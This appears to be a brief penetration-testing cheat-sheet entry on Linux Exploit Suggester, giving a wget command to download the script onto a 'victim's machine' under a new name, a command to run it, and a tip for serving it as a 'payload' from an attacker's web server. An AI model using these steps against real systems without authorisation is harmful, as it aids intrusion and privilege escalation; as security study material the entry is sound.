# Linux Exploit Suggester

Linux Exploit Suggester does pretty much what its name says: it helps in detecting security deficencies for given Linux kernel/Linux-based machine. 

## Installation

Download from [https://github.com/The-Z-Labs/linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester).

You can also download it from and to the victim's machine with a different name, let's say "les.sh":

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
``` 

## Basic commands

Execute it making sure of having execution permissions first:

```bash
./linux-exploit-suggester.sh
```

Also, a nice way to serve this payload is copying the file into the folder /var/www/html of the attacker machine and then run:

```bash
service apache2 start
```
